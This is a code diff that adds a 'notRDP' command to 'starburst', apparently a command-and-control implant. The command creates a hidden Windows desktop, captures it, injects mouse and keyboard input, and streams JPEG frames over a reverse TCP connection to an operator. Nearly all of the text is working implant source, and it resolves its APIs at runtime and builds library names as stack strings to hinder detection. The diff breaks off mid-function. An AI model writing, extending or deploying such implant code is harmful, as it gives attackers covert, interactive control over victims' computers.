@@ -1,8 +1,8 @@
 diff --git a/Payload_Type/starburst/starburst/agent_code/include/command_table.h b/Payload_Type/starburst/starburst/agent_code/include/command_table.h
-index de83db2..68331df 100644
+index de83db2..2269c59 100644
 --- a/Payload_Type/starburst/starburst/agent_code/include/command_table.h
 +++ b/Payload_Type/starburst/starburst/agent_code/include/command_table.h
-@@ -456,6 +456,12 @@ namespace starburst {
+@@ -456,6 +456,11 @@ namespace starburst {
    #define CMD_REG_LLDP_DISCONNECT
  #endif
  
@@ -11,11 +11,10 @@ index de83db2..68331df 100644
 +#else
 +  #define CMD_REG_NOTRDP
 +#endif
-+
  #define COMMAND_TABLE_ENTRIES \
      CMD_REG_EXIT              \
      CMD_REG_SLEEP             \
-@@ -523,6 +529,7 @@ namespace starburst {
+@@ -523,6 +528,7 @@ namespace starburst {
      CMD_REG_PORTSCAN          \
      CMD_REG_INLINE_EXECUTE    \
      CMD_REG_LOAD              \
@@ -24,20 +23,33 @@ index de83db2..68331df 100644
      CMD_REG_DCOMEXEC          \
      CMD_REG_EXECUTE_BOFPE     \
 diff --git a/Payload_Type/starburst/starburst/agent_code/include/commands.h b/Payload_Type/starburst/starburst/agent_code/include/commands.h
-index 927be7c..9252b73 100644
+index 927be7c..a837120 100644
 --- a/Payload_Type/starburst/starburst/agent_code/include/commands.h
 +++ b/Payload_Type/starburst/starburst/agent_code/include/commands.h
-@@ -237,6 +237,10 @@ namespace starburst {
+@@ -237,6 +237,9 @@ namespace starburst {
      auto declfn cmd_browserpivot( instance& inst, char* task_uuid, Parser* params ) -> void;
  #endif
  
 +#ifdef INCLUDE_CMD_NOTRDP
 +    auto declfn cmd_notrdp( instance& inst, char* task_uuid, Parser* params ) -> void;
 +#endif
-+
  #ifdef INCLUDE_CMD_CONNECT
      auto declfn cmd_connect( instance& inst, char* task_uuid, Parser* params ) -> void;
  #endif
+diff --git a/Payload_Type/starburst/starburst/agent_code/include/common.h b/Payload_Type/starburst/starburst/agent_code/include/common.h
+index 17625e4..b1cf3d0 100644
+--- a/Payload_Type/starburst/starburst/agent_code/include/common.h
++++ b/Payload_Type/starburst/starburst/agent_code/include/common.h
+@@ -520,6 +520,9 @@ namespace stardust
+ #ifdef INCLUDE_CMD_SOCKS
+         void* socks_state;
+ #endif
++#ifdef INCLUDE_CMD_NOTRDP
++        void* notrdp_state_ptr;
++#endif
+ #ifdef INCLUDE_CMD_SSH
+         void* ssh_state;
+ 
 diff --git a/Payload_Type/starburst/starburst/agent_code/include/config.h b/Payload_Type/starburst/starburst/agent_code/include/config.h
 index 257571f..2315e7d 100644
 --- a/Payload_Type/starburst/starburst/agent_code/include/config.h
@@ -60,10 +72,10 @@ index 257571f..2315e7d 100644
  
 diff --git a/Payload_Type/starburst/starburst/agent_code/src/commands/cmd_notrdp.cc b/Payload_Type/starburst/starburst/agent_code/src/commands/cmd_notrdp.cc
 new file mode 100644
-index 0000000..1001892
+index 0000000..c5d0207
 --- /dev/null
 +++ b/Payload_Type/starburst/starburst/agent_code/src/commands/cmd_notrdp.cc
-@@ -0,0 +1,872 @@
+@@ -0,0 +1,1761 @@
 +/*
 + * notRDP for Starburst — Invisible alternate Windows desktop with
 + * screen capture and interactive mouse/keyboard input.
@@ -74,8 +86,9 @@ index 0000000..1001892
 + *
 + * Operations:
 + *   start  — create hidden desktop, launch explorer.exe on it
-+ *   shot   — capture a BMP screenshot of the hidden desktop
++ *   shot   — capture a BMP screenshot through Mythic
 + *   input  — inject mouse/keyboard input (PostMessage-based)
++ *   live   — stream JPEG frames and input over a reverse TCP connection
 + *   stop   — teardown
 + */
 +
@@ -107,16 +120,37 @@ index 0000000..1001892
 +#define NR_SRCCOPY 0x00CC0020
 +#define NR_SWITCH_BLIP_MS 700
 +
++/* live streaming protocol (operator -> agent = "NRDP1" reverse socket) */
++#define NR_LIVE_MSG_FRAME 0x01 /* agent -> operator: jpeg frame */
++#define NR_LIVE_MSG_INPUT 0x02 /* operator -> agent: mouse/key event */
++#define NR_LIVE_QUALITY 40     /* GDI+ JPEG quality */
++#define NR_LIVE_INVALID (~(uintptr_t)0)
++#define NR_LIVE_INPUT_MSG 9 /* type(1) + x(2) + y(2) + action(2) + key(2) */
++
++/* EncoderQuality GUID 1D5BE4B5-FA4A-452D-9CDD-5DB3510557EF */
++static const uint8_t NR_GUID_ENCODER_QUALITY[16] = {
++    0xB5, 0xE4, 0x5B, 0x1D, 0x4A, 0xFA, 0x2D, 0x45,
++    0x9C, 0xDD, 0x5D, 0xB3, 0x51, 0x05, 0x57, 0xEF};
++/* JPEG encoder CLSID 557CF401-1A04-11D3-9A73-0000F81EF32E */
++static const uint8_t NR_GUID_JPEG_ENCODER[16] = {
++    0x01, 0xF4, 0x7C, 0x55, 0x04, 0x1A, 0xD3, 0x11,
++    0x9A, 0x73, 0x00, 0x00, 0xF8, 0x1E, 0xF3, 0x2E};
++
 +/* WM messages for PostMessage */
 +#define NR_WM_MOUSEMOVE 0x0200
 +#define NR_WM_LBUTTONDOWN 0x0201
 +#define NR_WM_LBUTTONUP 0x0202
++#define NR_WM_LBUTTONDBLCLK 0x0203
 +#define NR_WM_RBUTTONDOWN 0x0204
 +#define NR_WM_RBUTTONUP 0x0205
 +#define NR_WM_KEYDOWN 0x0100
++#define NR_WM_MOUSEWHEEL 0x020A
 +#define NR_WM_KEYUP 0x0101
 +#define NR_MK_LBUTTON 0x0001
 +#define NR_MK_RBUTTON 0x0002
++#define NR_CWP_SKIPINVISIBLE 0x0001
++#define NR_CWP_SKIPDISABLED 0x0002
++#define NR_CWP_SKIPTRANSPARENT 0x0004
 +
 +/* Bitmap header sizes */
 +#define NR_BITMAPFILEHEADER_SIZE 14
@@ -124,12 +158,25 @@ index 0000000..1001892
 +
 +struct NotRdpState {
 +  HANDLE h_desktop;
-+  HANDLE h_orig_desktop;
 +  HANDLE h_explorer_proc;
 +  HANDLE h_shell_proc;
 +  uint32_t explorer_pid;
 +  uint32_t shell_pid;
 +  bool active;
++  /* live streaming */
++  HANDLE live_thread;
++  uintptr_t live_sock;        /* uintptr_t SOCKET, NR_INVALID_SOCKET when off */
++  volatile long live_running; /* InterlockedExchange target */
++  uint32_t live_fps;
++  uint32_t live_scale;
++  uint32_t live_w; /* screen dims at live start */
++  uint32_t live_h;
++  /* live capture APIs are thread-local; only control state is shared */
++};
++
++struct NrPoint {
++  int32_t x;
++  int32_t y;
 +};
 +
 +/* Function typedefs — all resolved at runtime via GetProcAddress */
@@ -141,6 +188,7 @@ index 0000000..1001892
 +typedef int(WINAPI *fn_SetThreadDesktop)(void *);
 +typedef void *(WINAPI *fn_GetThreadDesktop)(uint32_t);
 +typedef int(WINAPI *fn_SwitchDesktop)(void *);
++typedef uint32_t(WINAPI *fn_GetCurrentThreadId)(void);
 +typedef int(WINAPI *fn_InitializeSecurityDescriptor)(void *, uint32_t);
 +typedef int(WINAPI *fn_SetSecurityDescriptorDacl)(void *, int, void *, int);
 +typedef BOOL(WINAPI *fn_CreateProcessW)(const wchar_t *, wchar_t *, void *,
@@ -162,9 +210,44 @@ index 0000000..1001892
 +typedef int(WINAPI *fn_DeleteObject)(void *);
 +typedef int(WINAPI *fn_DeleteDC)(HDC);
 +typedef BOOL(WINAPI *fn_PostMessageW)(void *, uint32_t, uintptr_t, intptr_t);
-+typedef void *(WINAPI *fn_WindowFromPoint)(int32_t, int32_t);
++typedef void *(WINAPI *fn_WindowFromPoint)(NrPoint);
 +typedef int(WINAPI *fn_ScreenToClient)(void *, void *);
++typedef void *(WINAPI *fn_ChildWindowFromPointEx)(void *, NrPoint, uint32_t);
 +typedef uint32_t(WINAPI *fn_GetWindowThreadProcessId)(void *, uint32_t *);
++typedef int(WINAPI *fn_AttachThreadInput)(uint32_t, uint32_t, int);
++typedef void *(WINAPI *fn_SetFocus)(void *);
++typedef uint32_t(WINAPI *fn_MapVirtualKeyA)(uint32_t, uint32_t);
++
++/* live streaming: winsock */
++typedef int(WINAPI *nr_fn_WSAStartup)(uint16_t, void *);
++typedef int(WINAPI *nr_fn_WSACleanup)(void);
++typedef uintptr_t(WINAPI *nr_fn_socket)(int, int, int);
++typedef int(WINAPI *nr_fn_connect)(uintptr_t, const void *, int);
++typedef int(WINAPI *nr_fn_send)(uintptr_t, const char *, int, int);
++typedef int(WINAPI *nr_fn_recv)(uintptr_t, char *, int, int);
++typedef int(WINAPI *nr_fn_closesocket)(uintptr_t);
++typedef int(WINAPI *nr_fn_select)(int, void *, void *, void *, const void *);
++typedef uint16_t(WINAPI *nr_fn_htons)(uint16_t);
++typedef unsigned long(WINAPI *nr_fn_inet_addr)(const char *);
++/* live streaming: gdi32 */
++typedef int(WINAPI *nr_fn_SetStretchBltMode)(HDC, int);
++typedef int(WINAPI *nr_fn_StretchBlt)(HDC, int, int, int, int, HDC, int, int,
++                                      int, int, uint32_t);
++/* live streaming: gdiplus + ole32 */
++typedef long(WINAPI *nr_fn_GdiplusStartup)(void *, void *, void *);
++typedef void(WINAPI *nr_fn_GdiplusShutdown)(void *);
++typedef long(WINAPI *nr_fn_GdipCreateBitmapFromHBITMAP)(void *, void *,
++                                                        void **);
++typedef long(WINAPI *nr_fn_GdipSaveImageToStream)(void *, void *, const void *,
++                                                  void *);
++typedef long(WINAPI *nr_fn_GdipDisposeImage)(void *);
++typedef long(WINAPI *nr_fn_CreateStreamOnHGlobal)(void *, int, void **);
++typedef long(WINAPI *nr_fn_GetHGlobalFromStream)(void *, void **);
++typedef long(WINAPI *nr_fn_ComRelease)(void *);
++typedef void *(WINAPI *nr_fn_GlobalLock)(void *);
++typedef int(WINAPI *nr_fn_GlobalUnlock)(void *);
++/* live streaming: IStream::Stat for exact encoded size */
++typedef long(WINAPI *nr_fn_StreamStat)(void *, void *, uint32_t);
 +
 +#pragma pack(push, 1)
 +struct NR_BITMAPINFOHEADER {
@@ -186,6 +269,650 @@ index 0000000..1001892
 +static auto declfn nr_to_wide(instance &inst, const char *s, wchar_t *out,
 +                              int out_cap) -> void {
 +  inst.kernel32.MultiByteToWideChar(65001, 0, s, -1, out, out_cap);
++}
++
++/* ── live streaming: reverse-socket browser mode ──
++ *
++ * The worker connects to the operator, activates the hidden desktop for
++ * the duration of the session, captures it with BitBlt, and encodes JPEG
++ * frames with GDI+. Input messages travel back over the same socket. */
++
++struct NrLiveCtx {
++  instance *inst;
++  NotRdpState *state;
++  char host[64];
++  uint32_t port;
++};
++
++struct NrCaptureApis {
++  fn_GetDC get_dc;
++  fn_ReleaseDC release_dc;
++  fn_SetThreadDesktop set_thread_desktop;
++  fn_SwitchDesktop switch_desktop;
++  fn_GetThreadDesktop get_thread_desktop;
++  fn_GetCurrentThreadId get_current_thread_id;
++  fn_CreateCompatibleDC create_compatible_dc;
++  fn_CreateCompatibleBitmap create_compatible_bitmap;
++  fn_SelectObject select_object;
++  fn_BitBlt bit_blt;
++  fn_DeleteObject delete_object;
++  fn_DeleteDC delete_dc;
++  nr_fn_SetStretchBltMode set_stretch_mode;
++  nr_fn_StretchBlt stretch_blt;
++  nr_fn_GdiplusStartup gdiplus_startup;
++  nr_fn_GdiplusShutdown gdiplus_shutdown;
++  nr_fn_GdipCreateBitmapFromHBITMAP create_gdip_bitmap;
++  nr_fn_GdipSaveImageToStream save_jpeg;
++  nr_fn_GdipDisposeImage dispose_image;
++  nr_fn_CreateStreamOnHGlobal create_stream;
++  nr_fn_GetHGlobalFromStream get_stream_hglobal;
++  nr_fn_GlobalLock global_lock;
++  nr_fn_GlobalUnlock global_unlock;
++  void *gdiplus_token;
++};
++
++struct NrInputApis {
++  fn_SetThreadDesktop set_thread_desktop;
++  fn_GetThreadDesktop get_thread_desktop;
++  fn_GetCurrentThreadId get_current_thread_id;
++  fn_PostMessageW post_message;
++  fn_WindowFromPoint window_from_point;
++  fn_ScreenToClient screen_to_client;
++  fn_ChildWindowFromPointEx child_from_point;
++  fn_GetWindowThreadProcessId get_window_thread;
++  fn_AttachThreadInput attach_thread_input;
++  fn_SetFocus set_focus;
++  fn_MapVirtualKeyA map_virtual_key;
++};
++
++struct NrFdSet {
++  uint32_t count;
++  uintptr_t sock[1];
++};
++
++struct NrTimeval {
++  int32_t sec;
++  int32_t usec;
++};
++
++static auto declfn nr_init_input_apis(instance &inst, NrInputApis *apis)
++    -> bool;
++static auto declfn nr_input_resolved(NotRdpState *state, NrInputApis *apis,
++                                     int32_t x, int32_t y, int32_t action,
++                                     int32_t key) -> void;
++static auto declfn nr_input(instance &inst, NotRdpState *state, int32_t x,
++                            int32_t y, int32_t action, int32_t key) -> void;
++
++static auto declfn nr_send_all(nr_fn_send send_fn, uintptr_t sock,
++                               const uint8_t *buf, uint32_t len) -> bool {
++  uint32_t off = 0;
++  while (off < len) {
++    int n = send_fn(sock, reinterpret_cast<const char *>(buf + off),
++                    static_cast<int>(len - off), 0);
++    if (n <= 0)
++      return false;
++    off += static_cast<uint32_t>(n);
++  }
++  return true;
++}
++
++static auto declfn nr_init_capture_apis(instance &inst, NrCaptureApis *apis)
++    -> bool {
++  memory::zero(apis, sizeof(NrCaptureApis));
++
++  STK_USER32(_u32);
++  STK_GDI32(_g32);
++  STK_OLE32(_ole);
++  char gdiplus_s[] = {'g', 'd', 'i', 'p', 'l', 'u', 's', '.', 'd', 'l', 'l', 0};
++
++  auto h_user32 = inst.kernel32.LoadLibraryA(_u32);
++  auto h_gdi32 = inst.kernel32.LoadLibraryA(_g32);
++  auto h_ole32 = inst.kernel32.LoadLibraryA(_ole);
++  auto h_gdiplus = inst.kernel32.LoadLibraryA(gdiplus_s);
++  if (!h_user32 || !h_gdi32 || !h_ole32 || !h_gdiplus)
++    return false;
++
++  auto gpa = inst.kernel32.GetProcAddress;
++  auto u32m = reinterpret_cast<HMODULE>(h_user32);
++  auto g32m = reinterpret_cast<HMODULE>(h_gdi32);
++  auto olem = reinterpret_cast<HMODULE>(h_ole32);
++  auto gpm = reinterpret_cast<HMODULE>(h_gdiplus);
++  auto k32m = reinterpret_cast<HMODULE>(inst.kernel32.handle);
++
++  apis->get_dc = reinterpret_cast<fn_GetDC>(gpa(u32m, symbol<LPCSTR>("GetDC")));
++  apis->release_dc =
++      reinterpret_cast<fn_ReleaseDC>(gpa(u32m, symbol<LPCSTR>("ReleaseDC")));
++  apis->set_thread_desktop = reinterpret_cast<fn_SetThreadDesktop>(
++      gpa(u32m, symbol<LPCSTR>("SetThreadDesktop")));
++  apis->switch_desktop = reinterpret_cast<fn_SwitchDesktop>(
++      gpa(u32m, symbol<LPCSTR>("SwitchDesktop")));
++  apis->get_thread_desktop = reinterpret_cast<fn_GetThreadDesktop>(
++      gpa(u32m, symbol<LPCSTR>("GetThreadDesktop")));
++  apis->get_current_thread_id = reinterpret_cast<fn_GetCurrentThreadId>(
++      gpa(k32m, symbol<LPCSTR>("GetCurrentThreadId")));
++  apis->create_compatible_dc = reinterpret_cast<fn_CreateCompatibleDC>(
++      gpa(g32m, symbol<LPCSTR>("CreateCompatibleDC")));
++  apis->create_compatible_bitmap = reinterpret_cast<fn_CreateCompatibleBitmap>(
++      gpa(g32m, symbol<LPCSTR>("CreateCompatibleBitmap")));
++  apis->select_object = reinterpret_cast<fn_SelectObject>(
++      gpa(g32m, symbol<LPCSTR>("SelectObject")));
++  apis->bit_blt =
++      reinterpret_cast<fn_BitBlt>(gpa(g32m, symbol<LPCSTR>("BitBlt")));
++  apis->delete_object = reinterpret_cast<fn_DeleteObject>(
++      gpa(g32m, symbol<LPCSTR>("DeleteObject")));
++  apis->delete_dc =
++      reinterpret_cast<fn_DeleteDC>(gpa(g32m, symbol<LPCSTR>("DeleteDC")));
++  apis->set_stretch_mode = reinterpret_cast<nr_fn_SetStretchBltMode>(
++      gpa(g32m, symbol<LPCSTR>("SetStretchBltMode")));
++  apis->stretch_blt = reinterpret_cast<nr_fn_StretchBlt>(
++      gpa(g32m, symbol<LPCSTR>("StretchBlt")));
++  apis->gdiplus_startup = reinterpret_cast<nr_fn_GdiplusStartup>(
++      gpa(gpm, symbol<LPCSTR>("GdiplusStartup")));
++  apis->gdiplus_shutdown = reinterpret_cast<nr_fn_GdiplusShutdown>(
++      gpa(gpm, symbol<LPCSTR>("GdiplusShutdown")));
++  apis->create_gdip_bitmap =
++      reinterpret_cast<nr_fn_GdipCreateBitmapFromHBITMAP>(
++          gpa(gpm, symbol<LPCSTR>("GdipCreateBitmapFromHBITMAP")));
++  apis->save_jpeg = reinterpret_cast<nr_fn_GdipSaveImageToStream>(
++      gpa(gpm, symbol<LPCSTR>("GdipSaveImageToStream")));
++  apis->dispose_image = reinterpret_cast<nr_fn_GdipDisposeImage>(
++      gpa(gpm, symbol<LPCSTR>("GdipDisposeImage")));
++  apis->create_stream = reinterpret_cast<nr_fn_CreateStreamOnHGlobal>(
++      gpa(olem, symbol<LPCSTR>("CreateStreamOnHGlobal")));
++  apis->get_stream_hglobal = reinterpret_cast<nr_fn_GetHGlobalFromStream>(
++      gpa(olem, symbol<LPCSTR>("GetHGlobalFromStream")));
++  apis->global_lock = reinterpret_cast<nr_fn_GlobalLock>(
++      gpa(k32m, symbol<LPCSTR>("GlobalLock")));
++  apis->global_unlock = reinterpret_cast<nr_fn_GlobalUnlock>(
++      gpa(k32m, symbol<LPCSTR>("GlobalUnlock")));
++
++  const void *required[23] = {
++      (const void *)apis->get_dc,
++      (const void *)apis->release_dc,
++      (const void *)apis->set_thread_desktop,
++      (const void *)apis->switch_desktop,
++      (const void *)apis->get_thread_desktop,
++      (const void *)apis->get_current_thread_id,
++      (const void *)apis->create_compatible_dc,
++      (const void *)apis->create_compatible_bitmap,
++      (const void *)apis->select_object,
++      (const void *)apis->bit_blt,
++      (const void *)apis->delete_object,
++      (const void *)apis->delete_dc,
++      (const void *)apis->set_stretch_mode,
++      (const void *)apis->stretch_blt,
++      (const void *)apis->gdiplus_startup,
++      (const void *)apis->gdiplus_shutdown,
++      (const void *)apis->create_gdip_bitmap,
++      (const void *)apis->save_jpeg,
++      (const void *)apis->dispose_image,
++      (const void *)apis->create_stream,
++      (const void *)apis->get_stream_hglobal,
++      (const void *)apis->global_lock,
++      (const void *)apis->global_unlock,
++  };
++  for (uint32_t i = 0; i < 23; i++) {
++    if (!required[i])
++      return false;
++  }
++
++  uint8_t startup_input[32] = {};
++  *(uint32_t *)startup_input = 1; /* GdiplusVersion */
++  if (apis->gdiplus_startup(&apis->gdiplus_token, startup_input, nullptr) != 0)
++    return false;
++  return apis->gdiplus_token != nullptr;
++}
++
++/* The worker has already made the hidden desktop active. Capture one frame
++ * as an in-memory JPEG; ownership of the returned buffer passes to caller. */
++static auto declfn nr_capture_jpeg(instance &inst, NotRdpState *state,
++                                   NrCaptureApis *apis, uint8_t **out_buf,
++                                   uint32_t *out_len) -> bool {
++  *out_buf = nullptr;
++  *out_len = 0;
++
++  int32_t width = static_cast<int32_t>(state->live_w);
++  int32_t height = static_cast<int32_t>(state->live_h);
++  if (width <= 0 || height <= 0)
++    return false;
++
++  HDC screen_dc = apis->get_dc(nullptr);
++  if (!screen_dc)
++    return false;
++
++  HDC full_dc = apis->create_compatible_dc(screen_dc);
++  HGDIOBJ full_bmp = nullptr;
++  HGDIOBJ full_old = nullptr;
++  bool captured = false;
++  if (full_dc) {
++    full_bmp = apis->create_compatible_bitmap(screen_dc, width, height);
++    if (full_bmp) {
++      full_old = apis->select_object(full_dc, full_bmp);
++      captured = apis->bit_blt(full_dc, 0, 0, width, height, screen_dc, 0, 0,
++                               NR_SRCCOPY) != 0;
++    }
++  }
++  apis->release_dc(nullptr, screen_dc);
++
++  if (!captured) {
++    if (full_bmp) {
++      apis->select_object(full_dc, full_old);
++      apis->delete_object(full_bmp);
++    }
++    if (full_dc)
++      apis->delete_dc(full_dc);
++    return false;
++  }
++
++  HGDIOBJ out_bmp = full_bmp;
++  HDC small_dc = nullptr;
++  HGDIOBJ small_bmp = nullptr;
++  HGDIOBJ small_old = nullptr;
++  uint32_t scale = state->live_scale;
++  if (scale > 1) {
++    int32_t out_width = width / static_cast<int32_t>(scale);
++    int32_t out_height = height / static_cast<int32_t>(scale);
++    small_dc = apis->create_compatible_dc(full_dc);
++    if (small_dc)
++      small_bmp =
++          apis->create_compatible_bitmap(full_dc, out_width, out_height);
++    if (small_dc && small_bmp) {
++      small_old = apis->select_object(small_dc, small_bmp);
++      apis->set_stretch_mode(small_dc, 3 /* COLORONCOLOR */);
++      if (apis->stretch_blt(small_dc, 0, 0, out_width, out_height, full_dc, 0,
++                            0, width, height, NR_SRCCOPY))
++        out_bmp = small_bmp;
++    }
++  }
++
++  bool ok = false;
++  void *image = nullptr;
++  void *stream = nullptr;
++  void *hglobal = nullptr;
++  void *locked = nullptr;
++  do {
++    if (apis->create_gdip_bitmap(out_bmp, nullptr, &image) != 0 || !image)
++      break;
++    if (apis->create_stream(nullptr, 1, &stream) != 0 || !stream)
++      break;
++
++    /* EncoderParameters x64 layout: Count@0, pad to 8, then
++     * EncoderParameter { GUID@8, NumberOfValues@24, Type@28,
++     * Value pointer@32 }. */
++    uint8_t encoder_params[40] = {};
++    *(uint32_t *)encoder_params = 1;
++    memory::copy(encoder_params + 8,
++                 const_cast<uint8_t *>(NR_GUID_ENCODER_QUALITY), 16);
++    *(uint32_t *)(encoder_params + 24) = 1;
++    *(uint32_t *)(encoder_params + 28) = 4;
++    uint32_t quality = NR_LIVE_QUALITY;
++    *(uintptr_t *)(encoder_params + 32) = (uintptr_t)&quality;
++
++    if (apis->save_jpeg(image, stream, NR_GUID_JPEG_ENCODER, encoder_params) !=
++        0)
++      break;
++    if (apis->get_stream_hglobal(stream, &hglobal) != 0 || !hglobal)
++      break;
++
++    /* IStream::Stat is vtable slot 12. STATSTG.cbSize starts at offset 16. */
++    uint8_t stat_buf[80] = {};
++    void **vtable = *reinterpret_cast<void ***>(stream);
++    nr_fn_StreamStat stream_stat =
++        reinterpret_cast<nr_fn_StreamStat>(vtable[12]);
++    if (!stream_stat || stream_stat(stream, stat_buf, 0) != 0)
++      break;
++    uint64_t jpeg_len = *(uint64_t *)(stat_buf + 16);
++    if (jpeg_len == 0 || jpeg_len > (64u << 20))
++      break;
++
++    locked = apis->global_lock(hglobal);
++    if (!locked)
++      break;
++    auto jpeg = static_cast<uint8_t *>(
++        inst.heap_alloc(static_cast<uint32_t>(jpeg_len)));
++    if (!jpeg)
++      break;
++    memory::copy(jpeg, locked, static_cast<uint32_t>(jpeg_len));
++
++    *out_buf = jpeg;
++    *out_len = static_cast<uint32_t>(jpeg_len);
++    ok = true;
++  } while (0);
++
++  if (locked)
++    apis->global_unlock(hglobal);
++  if (stream) {
++    void **vtable = *reinterpret_cast<void ***>(stream);
++    nr_fn_ComRelease release_stream =
++        reinterpret_cast<nr_fn_ComRelease>(vtable[2]);
++    if (release_stream)
++      release_stream(stream);
++  }
++  if (image)
++    apis->dispose_image(image);
++
++  if (small_dc) {
++    if (small_bmp) {
++      apis->select_object(small_dc, small_old);
++      apis->delete_object(small_bmp);
++    }
++    apis->delete_dc(small_dc);
++  }
++  apis->select_object(full_dc, full_old);
++  apis->delete_object(full_bmp);
++  apis->delete_dc(full_dc);
++  return ok;
++}
++
++static auto declfn nr_live_stop(instance &inst, NotRdpState *state) -> void {
++  if (!state->live_running && state->live_sock == NR_LIVE_INVALID &&
++      !state->live_thread)
++    return;
++
++  InterlockedExchange(&state->live_running, 0);
++
++  uintptr_t sock = state->live_sock;
++  state->live_sock = NR_LIVE_INVALID;
++  if (sock != NR_LIVE_INVALID) {
++    STK_WS2_32(_ws2s);
++    auto h_ws2 = inst.kernel32.LoadLibraryA(_ws2s);
++    if (h_ws2) {
++      auto close_socket =
++          reinterpret_cast<nr_fn_closesocket>(inst.kernel32.GetProcAddress(
++              reinterpret_cast<HMODULE>(h_ws2), symbol<LPCSTR>("closesocket")));
++      if (close_socket)
++        close_socket(sock);
++    }
++  }
++
++  if (state->live_thread) {
++    inst.kernel32.WaitForSingleObject(state->live_thread, 0xFFFFFFFF);
++    inst.kernel32.CloseHandle(state->live_thread);
++    state->live_thread = nullptr;
++  }
++}
++
++static uint32_t WINAPI nr_live_thread(void *pv) {
++  NrLiveCtx *ctx = static_cast<NrLiveCtx *>(pv);
++  instance &inst = *ctx->inst;
++  NotRdpState *state = ctx->state;
++
++  STK_WS2_32(_ws2);
++  auto h_ws2 = inst.kernel32.LoadLibraryA(_ws2);
++  auto gpa = inst.kernel32.GetProcAddress;
++  auto ws2m = reinterpret_cast<HMODULE>(h_ws2);
++
++  nr_fn_WSAStartup wsa_startup =
++      h_ws2 ? reinterpret_cast<nr_fn_WSAStartup>(
++                  gpa(ws2m, symbol<LPCSTR>("WSAStartup")))
++            : nullptr;
++  nr_fn_WSACleanup wsa_cleanup =
++      h_ws2 ? reinterpret_cast<nr_fn_WSACleanup>(
++                  gpa(ws2m, symbol<LPCSTR>("WSACleanup")))
++            : nullptr;
++  nr_fn_socket create_socket =
++      h_ws2
++          ? reinterpret_cast<nr_fn_socket>(gpa(ws2m, symbol<LPCSTR>("socket")))
++          : nullptr;
++  nr_fn_connect connect_socket = h_ws2 ? reinterpret_cast<nr_fn_connect>(gpa(
++                                             ws2m, symbol<LPCSTR>("connect")))
++                                       : nullptr;
++  nr_fn_send send_socket =
++      h_ws2 ? reinterpret_cast<nr_fn_send>(gpa(ws2m, symbol<LPCSTR>("send")))
++            : nullptr;
++  nr_fn_recv recv_socket =
++      h_ws2 ? reinterpret_cast<nr_fn_recv>(gpa(ws2m, symbol<LPCSTR>("recv")))
++            : nullptr;
++  nr_fn_closesocket close_socket =
++      h_ws2 ? reinterpret_cast<nr_fn_closesocket>(
++                  gpa(ws2m, symbol<LPCSTR>("closesocket")))
++            : nullptr;
++  nr_fn_select select_socket =
++      h_ws2
++          ? reinterpret_cast<nr_fn_select>(gpa(ws2m, symbol<LPCSTR>("select")))
++          : nullptr;
++  nr_fn_htons host_to_network_short =
++      h_ws2 ? reinterpret_cast<nr_fn_htons>(gpa(ws2m, symbol<LPCSTR>("htons")))
++            : nullptr;
++  nr_fn_inet_addr parse_ipv4 = h_ws2 ? reinterpret_cast<nr_fn_inet_addr>(gpa(
++                                           ws2m, symbol<LPCSTR>("inet_addr")))
++                                     : nullptr;
++
++  bool wsa_started = false;
++  bool capture_started = false;
++  bool thread_on_hidden = false;
++  bool hidden_active = false;
++  uintptr_t sock = NR_LIVE_INVALID;
++  void *original_desktop = nullptr;
++  NrCaptureApis capture_apis;
++  memory::zero(&capture_apis, sizeof(capture_apis));
++  NrInputApis input_apis;
++  memory::zero(&input_apis, sizeof(input_apis));
++
++  do {
++    const void *socket_apis[10] = {
++        (const void *)wsa_startup,           (const void *)wsa_cleanup,
++        (const void *)create_socket,         (const void *)connect_socket,
++        (const void *)send_socket,           (const void *)recv_socket,
++        (const void *)close_socket,          (const void *)select_socket,
++        (const void *)host_to_network_short, (const void *)parse_ipv4,
++    };
++    bool socket_apis_ok = true;
++    for (uint32_t i = 0; i < 10; i++) {
++      if (!socket_apis[i]) {
++        socket_apis_ok = false;
++        break;
++      }
++    }
++    if (!socket_apis_ok)
++      break;
++
++    uint8_t wsa_data[512] = {};
++    if (wsa_startup(0x0202, wsa_data) != 0)
++      break;
++    wsa_started = true;
++
++    if (!nr_init_capture_apis(inst, &capture_apis))
++      break;
++    capture_started = true;
++    if (!nr_init_input_apis(inst, &input_apis))
++      break;
++
++    struct NrSockaddrIn {
++      int16_t family;
++      uint16_t port;
++      uint32_t address;
++      uint8_t padding[8];
++    };
++    NrSockaddrIn address;
++    memory::zero(&address, sizeof(address));
++    address.family = 2; /* AF_INET */
++    address.port = host_to_network_short(static_cast<uint16_t>(ctx->port));
++    address.address = parse_ipv4(ctx->host);
++    if (address.address == 0xFFFFFFFF)
++      break;
++
++    sock = create_socket(2 /* AF_INET */, 1 /* SOCK_STREAM */,
++                         6 /* IPPROTO_TCP */);
++    if (sock == NR_LIVE_INVALID || sock == 0)
++      break;
++    state->live_sock = sock;
++    if (connect_socket(sock, &address, sizeof(address)) != 0)
++      break;
++
++    /* magic(4), version(1), width(4), height(4), scale(1), big-endian */
++    uint8_t handshake[14];
++    handshake[0] = 'N';
++    handshake[1] = 'R';
++    handshake[2] = 'D';
++    handshake[3] = 'P';
++    handshake[4] = 1;
++    handshake[5] = static_cast<uint8_t>(state->live_w >> 24);
++    handshake[6] = static_cast<uint8_t>(state->live_w >> 16);
++    handshake[7] = static_cast<uint8_t>(state->live_w >> 8);
++    handshake[8] = static_cast<uint8_t>(state->live_w);
++    handshake[9] = static_cast<uint8_t>(state->live_h >> 24);
++    handshake[10] = static_cast<uint8_t>(state->live_h >> 16);
++    handshake[11] = static_cast<uint8_t>(state->live_h >> 8);
++    handshake[12] = static_cast<uint8_t>(state->live_h);
++    handshake[13] = static_cast<uint8_t>(state->live_scale);
++    if (!nr_send_all(send_socket, sock, handshake, sizeof(handshake)))
++      break;
++
++    original_desktop =
++        capture_apis.get_thread_desktop(capture_apis.get_current_thread_id());
++    if (!original_desktop || !capture_apis.set_thread_desktop(state->h_desktop))
++      break;
++    thread_on_hidden = true;
++    if (!capture_apis.switch_desktop(state->h_desktop))
++      break;
++    hidden_active = true;
++    inst.kernel32.Sleep(NR_SWITCH_BLIP_MS);
++
++    uint8_t input_buffer[64];
++    uint32_t input_len = 0;
++    while (state->live_running && state->live_sock == sock) {
++      NrFdSet read_set;
++      read_set.count = 1;
++      read_set.sock[0] = sock;
++      NrTimeval timeout;
++      timeout.sec = 0;
++      timeout.usec = 0;
++      int selected = select_socket(0, &read_set, nullptr, nullptr, &timeout);
++      if (selected < 0)
++        break;
++      if (selected > 0) {
++        uint8_t received[256];
++        int received_len = recv_socket(sock, reinterpret_cast<char *>(received),
++                                       sizeof(received), 0);
